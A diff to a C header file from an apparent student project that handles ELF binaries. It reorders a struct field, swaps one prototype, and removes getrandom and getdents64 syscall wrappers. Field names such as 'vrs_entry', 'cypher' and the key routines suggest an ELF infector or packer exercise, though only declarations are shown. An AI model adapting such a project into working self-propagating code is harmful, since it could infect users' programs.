@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:26:41 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/03/20 18:31:59 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/03/22 15:13:39 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -93,11 +93,12 @@ typedef struct	s_data
 	t_cypher	cypher;
 
 	// misc
-	size_t		context;
 	Elf64_Ehdr	*header;
 	Elf64_Addr	bin_entry;
 	Elf64_Addr	vrs_entry;
 	Elf64_Addr	cpr_entry;
+
+	size_t		context;
 }				t_data;
 
 /* Core */
@@ -119,11 +120,6 @@ void			update_one(t_key *key, char *ptr, size_t size);
 void			update_two(t_key *key, char *ptr, size_t size);
 void			revert_one(t_key *key, char *ptr, size_t size);
 void			revert_two(t_key *key, char *ptr, size_t size);
-int				random_number(int limit);
+void			end_of_data(void);
 
-/*
-**	Syscall
-*/
-ssize_t			_get_random(void *buf, size_t buflen, unsigned int flag);
-int				_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 #endif
